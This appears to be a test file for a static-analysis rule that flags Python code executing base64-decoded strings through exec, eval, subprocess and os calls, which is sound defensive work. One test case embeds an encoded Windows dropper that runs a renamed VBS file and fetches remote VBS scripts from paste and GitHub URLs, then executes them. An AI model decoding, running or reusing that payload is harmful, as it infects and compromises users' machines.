""" Tests for exec-base64 rule

    OK cases:
        - execute non-encoded string
    RULEID cases:
        - Builtin Python exec/eval
        - Subprocess module
        - os module
        - Command module
        
        Inner partitions:
            - Muliline executions with intermediate assignments
            - Including/excluding module name in function calls
"""


""" OK: executing a non-encoded string
"""
# ok: exec-base64
exec("foo/bar")

# ok: exec-base64
eval("bar")

# ok: exec-base64
popen("bar")


""" RULEID: using builtin Python funcs to execute a base64 encoded string
"""
# ruleid: exec-base64
exec(zlib.decompress(base64.b64decode("foo")))

# ruleid: exec-base64
exec(decode("bar"))

# ruleid: exec-base64
exec(base64.b64decode("bar"))

# ruleid: exec-base64
eval(base64.b64decode("bar"))

# ruleid: exec-base64
exec(
    "b3MxID0gcGxhdGZvcm0uc3lzdGVtKCkNCmlmIG9zMSA9PSAiV2luZG93cyI6DQogICAgdHJ5Og0KCQljdWVyZGEgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmFzY2lpX3VwcGVyY2FzZSArIHN0cmluZy5hc2NpaV9sb3dlcmNhc2UgKyBzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSg1KSkgKyAiLnZicyINCgkJb3MucmVuYW1lKCd0ZXN0LmpwZycsICJuZXcudmJzIikNCgkJb3Muc3lzdGVtKCJ3c2NyaXB0IG5ldy52YnMiKQ0KCQkjc3VicHJvY2Vzcy5jYWxsKCJ3c2NyaXB0IG5ldy52YnMiKQ0KICAgIGV4Y2VwdDoNCiAgICAJdHJ5Og0KICAgIAkJcmVxID0gdXJsbGliMi5SZXF1ZXN0KGJhc2U2NC5iNjRkZWNvZGUoImFIUjBjSE02THk5b1lYTjBaV0pwYmk1amIyMHZjbUYzTDJsa1lXMWxlRzluYVdJPT0iKSwgaGVhZGVycz17J1VzZXItQWdlbnQnIDogInRhY29fbGlmZSJ9KQ0KICAgIAkJdGV4dG8gPSB1cmxsaWIyLnVybG9wZW4oIHJlcSApLnJlYWQoKQ0KICAgIAkJeCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuYXNjaWlfdXBwZXJjYXNlICsgc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDE2KSkgKyAiLnZicyINCiAgICAJCWYgPSBvcGVuKHgsICJhIikNCiAgICAJCWYud3JpdGUoc3RyKHRleHRvKSkNCiAgICAJCWYuY2xvc2UoKQ0KICAgIAkJb3Muc3lzdGVtKCJ3c2NyaXB0ICVzICIgJSAgeCkNCiAgICAJZXhjZXB0Og0KCQkJdHJ5Og0KCQkJIAlyZXEgPSB1cmxsaWIyLlJlcXVlc3QoYmFzZTY0LmI2NGRlY29kZSgiYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMVJoWTI5TlJTOW9aV3hzYjNkdmNtUXZiV0Z6ZEdWeUwzUmhZMjlpWld4cyIpLCBoZWFkZXJzPXsnVXNlci1BZ2VudCcgOiAidGFjb19saWZlIn0pDQoJCQkgCXRleHRvID0gdXJsbGliMi51cmxvcGVuKCByZXEgKS5yZWFkKCkNCgkJCSAJeCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuYXNjaWlfdXBwZXJjYXNlICsgc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDE2KSkgKyAiLnZicyINCgkJCSAJZiA9IG9wZW4oeCwgImEiKQ0KCQkJIAlmLndyaXRlKHN0cih0ZXh0bykpDQoJCQkgCWYuY2xvc2UoKQ0KCQkJIAlvcy5zeXN0ZW0oIndzY3JpcHQgJXMgIiAlICB4KQ0KCQkJZXhjZXB0Og0KCQkJIAlwcmludA==".decode(
        "base64"
    )
)

myBase64Code = "bar"
myDecodedCode = base64.b64decode(myBase64Code)
# ruleid: exec-base64
exec(myDecodedCode)

""" RULEID: using the subprocess module to execute a base64 encoded string
"""
# ruleid: exec-base64
subprocess.check_output(["python", "-c", base64.b64decode("bar")])

# ruleid: exec-base64
subprocess.run(["python", "-c", base64.b64decode("bar")])

# ruleid: exec-base64
subprocess.call(["python", "-c", base64.b64decode("bar")])

# ruleid: exec-base64
subprocess.Popen(["python", "-c", base64.b64decode("bar")])

# ruleid: exec-base64
with Popen(["python", "-c", base64.b64decode("bar")], stdout=subprocess.PIPE) as proc:
    print(proc.stdout.read())


""" RULEID: using the os module to execute a base64 encoded string
"""
# ruleid: exec-base64
os.popen(base64.b64decode("bar"))

args = ["python", "-c", base64.b64decode("bar")]
# ruleid: exec-base64
os.execve(args[0], args, os.environ.copy())

# ruleid: exec-base64
os.system(base64.b64decode("bar"))

myMaliciousCode = requests.get("foo").json()["code"]
# ruleid: exec-base64
exec(base64.b64decode(myMaliciousCode))


""" RULEID: using the command module to execute a bse64 encoded string
"""
# ruleid: exec-base64
res = command.run(["python", "-c", base64.b64decode("bar")])
